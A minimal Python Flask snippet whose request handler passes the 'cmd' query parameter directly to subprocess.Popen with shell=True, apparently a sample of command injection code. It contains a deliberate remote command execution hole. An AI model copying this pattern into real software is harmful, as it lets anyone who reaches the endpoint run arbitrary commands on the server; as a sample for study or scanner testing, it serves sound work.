import subprocess

from flask import request


def handle_request():
    subprocess.Popen(request.args["cmd"], shell=True)
